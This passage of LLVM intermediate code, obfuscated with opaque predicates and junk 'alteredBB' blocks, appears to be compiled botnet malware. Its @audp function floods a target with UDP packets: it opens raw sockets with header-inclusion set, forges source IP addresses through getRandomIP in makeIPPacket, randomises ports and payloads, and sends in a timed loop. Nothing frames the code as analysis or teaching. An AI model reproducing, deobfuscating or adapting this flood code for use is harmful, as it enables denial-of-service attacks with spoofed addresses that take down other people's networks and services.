
originalBB6alteredBB:                             ; preds = %originalBB6, %68
  %207 = load i32, i32* %16, align 4
  %208 = icmp eq i32 %207, 1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %87
  %209 = load i16*, i16** %17, align 8
  %210 = bitcast i16* %209 to i8*
  %211 = load i8, i8* %210, align 1
  %212 = zext i8 %211 to i32
  %213 = load i32, i32* %20, align 4
  %_ = shl i32 %213, %212
  %_11 = sub i32 0, %213
  %gen = add i32 %_11, %212
  %214 = add i32 %213, %212
  store i32 %214, i32* %20, align 4
  br label %originalBB10

originalBB15alteredBB:                            ; preds = %originalBB15, %141
  %215 = load i32, i32* %20, align 4
  %_16 = sub i32 %215, 16
  %gen17 = mul i32 %_16, 16
  %_18 = shl i32 %215, 16
  %_19 = sub i32 %215, 16
  %gen20 = mul i32 %_19, 16
  %_21 = sub i32 %215, 16
  %gen22 = mul i32 %_21, 16
  %_23 = sub i32 %215, 16
  %gen24 = mul i32 %_23, 16
  %_25 = sub i32 %215, 16
  %gen26 = mul i32 %_25, 16
  %_27 = sub i32 0, %215
  %gen28 = add i32 %_27, 16
  %_29 = sub i32 %215, 16
  %gen30 = mul i32 %_29, 16
  %216 = lshr i32 %215, 16
  %217 = icmp ne i32 %216, 0
  br label %originalBB15

originalBB34alteredBB:                            ; preds = %originalBB34, %161
  %218 = load i32, i32* %20, align 4
  %_35 = shl i32 %218, 65535
  %_36 = sub i32 %218, 65535
  %gen37 = mul i32 %_36, 65535
  %_38 = sub i32 0, %218
  %gen39 = add i32 %_38, 65535
  %_40 = sub i32 %218, 65535
  %gen41 = mul i32 %_40, 65535
  %_42 = sub i32 %218, 65535
  %gen43 = mul i32 %_42, 65535
  %_44 = shl i32 %218, 65535
  %219 = and i32 %218, 65535
  %220 = load i32, i32* %20, align 4
  %_45 = sub i32 %220, 16
  %gen46 = mul i32 %_45, 16
  %_47 = sub i32 0, %220
  %gen48 = add i32 %_47, 16
  %_49 = sub i32 0, %220
  %gen50 = add i32 %_49, 16
  %_51 = sub i32 0, %220
  %gen52 = add i32 %_51, 16
  %_53 = shl i32 %220, 16
  %_54 = shl i32 %220, 16
  %_55 = shl i32 %220, 16
  %_56 = sub i32 %220, 16
  %gen57 = mul i32 %_56, 16
  %221 = lshr i32 %220, 16
  %_58 = sub i32 %219, %221
  %gen59 = mul i32 %_58, %221
  %_60 = shl i32 %219, %221
  %_61 = sub i32 0, %219
  %gen62 = add i32 %_61, %221
  %_63 = sub i32 0, %219
  %gen64 = add i32 %_63, %221
  %_65 = shl i32 %219, %221
  %_66 = sub i32 0, %219
  %gen67 = add i32 %_66, %221
  %222 = add i32 %219, %221
  store i32 %222, i32* %20, align 4
  br label %originalBB34
}

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @audp(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = load i32, i32* @x.39
  %8 = load i32, i32* @y.40
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.sockaddr_in, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i8*, align 8
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.udphdr*, align 8
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  store i8* %0, i8** %15, align 8
  store i32 %1, i32* %16, align 4
  store i32 %2, i32* %17, align 4
  store i32 %3, i32* %18, align 4
  store i32 %4, i32* %19, align 4
  store i32 %5, i32* %20, align 4
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 0
  store i16 2, i16* %36, align 4
  %37 = load i32, i32* %16, align 4
  %38 = icmp eq i32 %37, 0
  %39 = load i32, i32* @x.39
  %40 = load i32, i32* @y.40
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %38, label %47, label %67

; <label>:47:                                     ; preds = %originalBBpart2
  %48 = load i32, i32* @x.39
  %49 = load i32, i32* @y.40
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %47
  %56 = call i32 @rand_cmwc()
  %57 = trunc i32 %56 to i16
  %58 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 1
  store i16 %57, i16* %58, align 2
  %59 = load i32, i32* @x.39
  %60 = load i32, i32* @y.40
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %72

; <label>:67:                                     ; preds = %originalBBpart2
  %68 = load i32, i32* %16, align 4
  %69 = trunc i32 %68 to i16
  %70 = call zeroext i16 @htons(i16 zeroext %69) #9
  %71 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 1
  store i16 %70, i16* %71, align 2
  br label %72

; <label>:72:                                     ; preds = %67, %originalBBpart24
  %73 = load i8*, i8** %15, align 8
  %74 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 2
  %75 = call i32 @getHost(i8* %73, %struct.in_addr* %74)
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %77, label %78

; <label>:77:                                     ; preds = %72
  br label %503

; <label>:78:                                     ; preds = %72
  %79 = load i32, i32* @x.39
  %80 = load i32, i32* @y.40
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %78
  %87 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 3
  %88 = getelementptr inbounds [8 x i8], [8 x i8]* %87, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %88, i8 0, i64 8, i32 4, i1 false)
  %89 = load i32, i32* %20, align 4
  store i32 %89, i32* %22, align 4
  %90 = load i32, i32* %18, align 4
  %91 = icmp eq i32 %90, 32
  %92 = load i32, i32* @x.39
  %93 = load i32, i32* @y.40
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %91, label %100, label %214

; <label>:100:                                    ; preds = %originalBBpart28
  %101 = load i32, i32* @x.39
  %102 = load i32, i32* @y.40
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %100
  %109 = call i32 @socket(i32 2, i32 2, i32 17) #6
  store i32 %109, i32* %23, align 4
  %110 = load i32, i32* %23, align 4
  %111 = icmp ne i32 %110, 0
  %112 = load i32, i32* @x.39
  %113 = load i32, i32* @y.40
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %111, label %121, label %120

; <label>:120:                                    ; preds = %originalBBpart212
  br label %503

; <label>:121:                                    ; preds = %originalBBpart212
  %122 = load i32, i32* %19, align 4
  %123 = add nsw i32 %122, 1
  %124 = sext i32 %123 to i64
  %125 = call noalias i8* @malloc(i64 %124) #6
  store i8* %125, i8** %24, align 8
  %126 = load i8*, i8** %24, align 8
  %127 = icmp eq i8* %126, null
  br i1 %127, label %128, label %129

; <label>:128:                                    ; preds = %121
  br label %503

; <label>:129:                                    ; preds = %121
  %130 = load i8*, i8** %24, align 8
  %131 = load i32, i32* %19, align 4
  %132 = add nsw i32 %131, 1
  %133 = sext i32 %132 to i64
  call void @llvm.memset.p0i8.i64(i8* %130, i8 0, i64 %133, i32 1, i1 false)
  %134 = load i8*, i8** %24, align 8
  %135 = load i32, i32* %19, align 4
  call void @makeRandomStr(i8* %134, i32 %135)
  %136 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %137 = load i32, i32* %17, align 4
  %138 = add nsw i32 %136, %137
  store i32 %138, i32* %25, align 4
  store i32 0, i32* %26, align 4
  br label %139

; <label>:139:                                    ; preds = %originalBBpart227, %177, %129
  %140 = load i32, i32* @x.39
  %141 = load i32, i32* @y.40
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %139
  %148 = load i32, i32* %23, align 4
  %149 = load i8*, i8** %24, align 8
  %150 = load i32, i32* %19, align 4
  %151 = sext i32 %150 to i64
  %152 = bitcast %struct.sockaddr_in* %21 to %struct.sockaddr*
  %153 = call i64 @sendto(i32 %148, i8* %149, i64 %151, i32 0, %struct.sockaddr* %152, i32 16)
  %154 = load i32, i32* %26, align 4
  %155 = load i32, i32* %22, align 4
  %156 = icmp eq i32 %154, %155
  %157 = load i32, i32* @x.39
  %158 = load i32, i32* @y.40
  %159 = sub i32 %157, 1
  %160 = mul i32 %157, %159
  %161 = urem i32 %160, 2
  %162 = icmp eq i32 %161, 0
  %163 = icmp slt i32 %158, 10
  %164 = or i1 %162, %163
  br i1 %164, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %156, label %165, label %178

; <label>:165:                                    ; preds = %originalBBpart216
  %166 = load i32, i32* %16, align 4
  %167 = icmp eq i32 %166, 0
  br i1 %167, label %168, label %172

; <label>:168:                                    ; preds = %165
  %169 = call i32 @rand_cmwc()
  %170 = trunc i32 %169 to i16
  %171 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 1
  store i16 %170, i16* %171, align 2
  br label %172

; <label>:172:                                    ; preds = %168, %165
  %173 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %174 = load i32, i32* %25, align 4
  %175 = icmp sgt i32 %173, %174
  br i1 %175, label %176, label %177

; <label>:176:                                    ; preds = %172
  br label %197

; <label>:177:                                    ; preds = %172
  store i32 0, i32* %26, align 4
  br label %139

; <label>:178:                                    ; preds = %originalBBpart216
  %179 = load i32, i32* @x.39
  %180 = load i32, i32* @y.40
  %181 = sub i32 %179, 1
  %182 = mul i32 %179, %181
  %183 = urem i32 %182, 2
  %184 = icmp eq i32 %183, 0
  %185 = icmp slt i32 %180, 10
  %186 = or i1 %184, %185
  br i1 %186, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %178
  %187 = load i32, i32* %26, align 4
  %188 = add i32 %187, 1
  store i32 %188, i32* %26, align 4
  %189 = load i32, i32* @x.39
  %190 = load i32, i32* @y.40
  %191 = sub i32 %189, 1
  %192 = mul i32 %189, %191
  %193 = urem i32 %192, 2
  %194 = icmp eq i32 %193, 0
  %195 = icmp slt i32 %190, 10
  %196 = or i1 %194, %195
  br i1 %196, label %originalBBpart227, label %originalBB18alteredBB

originalBBpart227:                                ; preds = %originalBB18
  br label %139

; <label>:197:                                    ; preds = %176
  %198 = load i32, i32* @x.39
  %199 = load i32, i32* @y.40
  %200 = sub i32 %198, 1
  %201 = mul i32 %198, %200
  %202 = urem i32 %201, 2
  %203 = icmp eq i32 %202, 0
  %204 = icmp slt i32 %199, 10
  %205 = or i1 %203, %204
  br i1 %205, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %197
  %206 = load i32, i32* @x.39
  %207 = load i32, i32* @y.40
  %208 = sub i32 %206, 1
  %209 = mul i32 %206, %208
  %210 = urem i32 %209, 2
  %211 = icmp eq i32 %210, 0
  %212 = icmp slt i32 %207, 10
  %213 = or i1 %211, %212
  br i1 %213, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br label %503

; <label>:214:                                    ; preds = %originalBBpart28
  %215 = load i32, i32* @x.39
  %216 = load i32, i32* @y.40
  %217 = sub i32 %215, 1
  %218 = mul i32 %215, %217
  %219 = urem i32 %218, 2
  %220 = icmp eq i32 %219, 0
  %221 = icmp slt i32 %216, 10
  %222 = or i1 %220, %221
  br i1 %222, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %214
  %223 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %223, i32* %27, align 4
  %224 = load i32, i32* %27, align 4
  %225 = icmp ne i32 %224, 0
  %226 = load i32, i32* @x.39
  %227 = load i32, i32* @y.40
  %228 = sub i32 %226, 1
  %229 = mul i32 %226, %228
  %230 = urem i32 %229, 2
  %231 = icmp eq i32 %230, 0
  %232 = icmp slt i32 %227, 10
  %233 = or i1 %231, %232
  br i1 %233, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br i1 %225, label %235, label %234

; <label>:234:                                    ; preds = %originalBBpart235
  br label %503

; <label>:235:                                    ; preds = %originalBBpart235
  %236 = load i32, i32* @x.39
  %237 = load i32, i32* @y.40
  %238 = sub i32 %236, 1
  %239 = mul i32 %236, %238
  %240 = urem i32 %239, 2
  %241 = icmp eq i32 %240, 0
  %242 = icmp slt i32 %237, 10
  %243 = or i1 %241, %242
  br i1 %243, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %235
  store i32 1, i32* %28, align 4
  %244 = load i32, i32* %27, align 4
  %245 = bitcast i32* %28 to i8*
  %246 = call i32 @setsockopt(i32 %244, i32 0, i32 3, i8* %245, i32 4) #6
  %247 = icmp slt i32 %246, 0
  %248 = load i32, i32* @x.39
  %249 = load i32, i32* @y.40
  %250 = sub i32 %248, 1
  %251 = mul i32 %248, %250
  %252 = urem i32 %251, 2
  %253 = icmp eq i32 %252, 0
  %254 = icmp slt i32 %249, 10
  %255 = or i1 %253, %254
  br i1 %255, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br i1 %247, label %256, label %257

; <label>:256:                                    ; preds = %originalBBpart239
  br label %503

; <label>:257:                                    ; preds = %originalBBpart239
  %258 = load i32, i32* @x.39
  %259 = load i32, i32* @y.40
  %260 = sub i32 %258, 1
  %261 = mul i32 %258, %260
  %262 = urem i32 %261, 2
  %263 = icmp eq i32 %262, 0
  %264 = icmp slt i32 %259, 10
  %265 = or i1 %263, %264
  br i1 %265, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %257
  store i32 50, i32* %29, align 4
  %266 = load i32, i32* @x.39
  %267 = load i32, i32* @y.40
  %268 = sub i32 %266, 1
  %269 = mul i32 %266, %268
  %270 = urem i32 %269, 2
  %271 = icmp eq i32 %270, 0
  %272 = icmp slt i32 %267, 10
  %273 = or i1 %271, %272
  br i1 %273, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br label %274

; <label>:274:                                    ; preds = %278, %originalBBpart243
  %275 = load i32, i32* %29, align 4
  %276 = add nsw i32 %275, -1
  store i32 %276, i32* %29, align 4
  %277 = icmp ne i32 %275, 0
  br i1 %277, label %278, label %283

; <label>:278:                                    ; preds = %274
  %279 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %280 = call i32 @rand_cmwc()
  %281 = xor i32 %279, %280
  call void @srand(i32 %281) #6
  %282 = call i32 @rand() #6
  call void @init_rand(i32 %282)
  br label %274

; <label>:283:                                    ; preds = %274
  %284 = load i32, i32* %18, align 4
  %285 = icmp eq i32 %284, 0
  br i1 %285, label %286, label %287

; <label>:286:                                    ; preds = %283
  store i32 0, i32* %30, align 4
  br label %309

; <label>:287:                                    ; preds = %283
  %288 = load i32, i32* @x.39
  %289 = load i32, i32* @y.40
  %290 = sub i32 %288, 1
  %291 = mul i32 %288, %290
  %292 = urem i32 %291, 2
  %293 = icmp eq i32 %292, 0
  %294 = icmp slt i32 %289, 10
  %295 = or i1 %293, %294
  br i1 %295, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %287
  %296 = load i32, i32* %18, align 4
  %297 = sub nsw i32 32, %296
  %298 = shl i32 1, %297
  %299 = sub nsw i32 %298, 1
  %300 = xor i32 %299, -1
  store i32 %300, i32* %30, align 4
  %301 = load i32, i32* @x.39
  %302 = load i32, i32* @y.40
  %303 = sub i32 %301, 1
  %304 = mul i32 %301, %303
  %305 = urem i32 %304, 2
  %306 = icmp eq i32 %305, 0
  %307 = icmp slt i32 %302, 10
  %308 = or i1 %306, %307
  br i1 %308, label %originalBBpart273, label %originalBB45alteredBB

originalBBpart273:                                ; preds = %originalBB45
  br label %309

; <label>:309:                                    ; preds = %originalBBpart273, %286
  %310 = load i32, i32* @x.39
  %311 = load i32, i32* @y.40
  %312 = sub i32 %310, 1
  %313 = mul i32 %310, %312
  %314 = urem i32 %313, 2
  %315 = icmp eq i32 %314, 0
  %316 = icmp slt i32 %311, 10
  %317 = or i1 %315, %316
  br i1 %317, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %309
  %318 = load i32, i32* %19, align 4
  %319 = sext i32 %318 to i64
  %320 = add i64 28, %319
  %321 = call i8* @llvm.stacksave()
  store i8* %321, i8** %31, align 8
  %322 = alloca i8, i64 %320, align 16
  %323 = bitcast i8* %322 to %struct.iphdr*
  store %struct.iphdr* %323, %struct.iphdr** %32, align 8
  %324 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %325 = bitcast %struct.iphdr* %324 to i8*
  %326 = getelementptr i8, i8* %325, i64 20
  %327 = bitcast i8* %326 to %struct.udphdr*
  store %struct.udphdr* %327, %struct.udphdr** %33, align 8
  %328 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %329 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 2
  %330 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %329, i32 0, i32 0
  %331 = load i32, i32* %330, align 4
  %332 = load i32, i32* %30, align 4
  %333 = call i32 @getRandomIP(i32 %332)
  %334 = call i32 @htonl(i32 %333) #9
  %335 = load i32, i32* %19, align 4
  %336 = sext i32 %335 to i64
  %337 = add i64 8, %336
  %338 = trunc i64 %337 to i32
  call void @makeIPPacket(%struct.iphdr* %328, i32 %331, i32 %334, i8 zeroext 17, i32 %338)
  %339 = load i32, i32* %19, align 4
  %340 = sext i32 %339 to i64
  %341 = add i64 8, %340
  %342 = trunc i64 %341 to i16
  %343 = call zeroext i16 @htons(i16 zeroext %342) #9
  %344 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %345 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %344, i32 0, i32 0
  %346 = bitcast %union.anon.3* %345 to %struct.anon.4*
  %347 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %346, i32 0, i32 2
  store i16 %343, i16* %347, align 2
  %348 = call i32 @rand_cmwc()
  %349 = trunc i32 %348 to i16
  %350 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %351 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %350, i32 0, i32 0
  %352 = bitcast %union.anon.3* %351 to %struct.anon.4*
  %353 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %352, i32 0, i32 0
  store i16 %349, i16* %353, align 2
  %354 = load i32, i32* %16, align 4
  %355 = icmp eq i32 %354, 0
  %356 = load i32, i32* @x.39
  %357 = load i32, i32* @y.40
  %358 = sub i32 %356, 1
  %359 = mul i32 %356, %358
  %360 = urem i32 %359, 2
  %361 = icmp eq i32 %360, 0
  %362 = icmp slt i32 %357, 10
  %363 = or i1 %361, %362
  br i1 %363, label %originalBBpart289, label %originalBB75alteredBB

originalBBpart289:                                ; preds = %originalBB75
  br i1 %355, label %364, label %366

; <label>:364:                                    ; preds = %originalBBpart289
  %365 = call i32 @rand_cmwc()
  br label %371

; <label>:366:                                    ; preds = %originalBBpart289
  %367 = load i32, i32* %16, align 4
  %368 = trunc i32 %367 to i16
  %369 = call zeroext i16 @htons(i16 zeroext %368) #9
  %370 = zext i16 %369 to i32
  br label %371

; <label>:371:                                    ; preds = %366, %364
  %372 = phi i32 [ %365, %364 ], [ %370, %366 ]
  %373 = load i32, i32* @x.39
  %374 = load i32, i32* @y.40
  %375 = sub i32 %373, 1
  %376 = mul i32 %373, %375
  %377 = urem i32 %376, 2
  %378 = icmp eq i32 %377, 0
  %379 = icmp slt i32 %374, 10
  %380 = or i1 %378, %379
  br i1 %380, label %originalBB91, label %originalBB91alteredBB

originalBB91:                                     ; preds = %originalBB91alteredBB, %371
  %381 = trunc i32 %372 to i16
  %382 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %383 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %382, i32 0, i32 0
  %384 = bitcast %union.anon.3* %383 to %struct.anon.4*
  %385 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %384, i32 0, i32 1
  store i16 %381, i16* %385, align 2
  %386 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %387 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %386, i32 0, i32 0
  %388 = bitcast %union.anon.3* %387 to %struct.anon.4*
  %389 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %388, i32 0, i32 3
  store i16 0, i16* %389, align 2
  %390 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %391 = bitcast %struct.udphdr* %390 to i8*
  %392 = getelementptr inbounds i8, i8* %391, i64 8
  %393 = load i32, i32* %19, align 4
  call void @makeRandomStr(i8* %392, i32 %393)
  %394 = bitcast i8* %322 to i16*
  %395 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %396 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %395, i32 0, i32 2
  %397 = load i16, i16* %396, align 2
  %398 = zext i16 %397 to i32
  %399 = call zeroext i16 @csum(i16* %394, i32 %398)
  %400 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %401 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %400, i32 0, i32 7
  store i16 %399, i16* %401, align 2
  %402 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %403 = load i32, i32* %17, align 4
  %404 = add nsw i32 %402, %403
  store i32 %404, i32* %34, align 4
  store i32 0, i32* %35, align 4
  %405 = load i32, i32* @x.39
  %406 = load i32, i32* @y.40
  %407 = sub i32 %405, 1
  %408 = mul i32 %405, %407
  %409 = urem i32 %408, 2
  %410 = icmp eq i32 %409, 0
  %411 = icmp slt i32 %406, 10
  %412 = or i1 %410, %411
  br i1 %412, label %originalBBpart298, label %originalBB91alteredBB

originalBBpart298:                                ; preds = %originalBB91
  br label %413

; <label>:413:                                    ; preds = %498, %originalBBpart2106, %originalBBpart298
  br label %414

; <label>:414:                                    ; preds = %413
  %415 = load i32, i32* %27, align 4
  %416 = bitcast %struct.sockaddr_in* %21 to %struct.sockaddr*
  %417 = call i64 @sendto(i32 %415, i8* %322, i64 %320, i32 0, %struct.sockaddr* %416, i32 16)
  %418 = call i32 @rand_cmwc()
  %419 = trunc i32 %418 to i16
  %420 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %421 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %420, i32 0, i32 0
  %422 = bitcast %union.anon.3* %421 to %struct.anon.4*
  %423 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %422, i32 0, i32 0
  store i16 %419, i16* %423, align 2
  %424 = load i32, i32* %16, align 4
  %425 = icmp eq i32 %424, 0
  br i1 %425, label %426, label %444

; <label>:426:                                    ; preds = %414
  %427 = load i32, i32* @x.39
  %428 = load i32, i32* @y.40
  %429 = sub i32 %427, 1
  %430 = mul i32 %427, %429
  %431 = urem i32 %430, 2
  %432 = icmp eq i32 %431, 0
  %433 = icmp slt i32 %428, 10
  %434 = or i1 %432, %433
  br i1 %434, label %originalBB100, label %originalBB100alteredBB

originalBB100:                                    ; preds = %originalBB100alteredBB, %426
  %435 = call i32 @rand_cmwc()
  %436 = load i32, i32* @x.39
  %437 = load i32, i32* @y.40
  %438 = sub i32 %436, 1
  %439 = mul i32 %436, %438
  %440 = urem i32 %439, 2
  %441 = icmp eq i32 %440, 0
  %442 = icmp slt i32 %437, 10
  %443 = or i1 %441, %442
  br i1 %443, label %originalBBpart2102, label %originalBB100alteredBB

originalBBpart2102:                               ; preds = %originalBB100
  br label %449

; <label>:444:                                    ; preds = %414
  %445 = load i32, i32* %16, align 4
  %446 = trunc i32 %445 to i16
  %447 = call zeroext i16 @htons(i16 zeroext %446) #9
  %448 = zext i16 %447 to i32
  br label %449

; <label>:449:                                    ; preds = %444, %originalBBpart2102
  %450 = phi i32 [ %435, %originalBBpart2102 ], [ %448, %444 ]
  %451 = trunc i32 %450 to i16
  %452 = load %struct.udphdr*, %struct.udphdr** %33, align 8
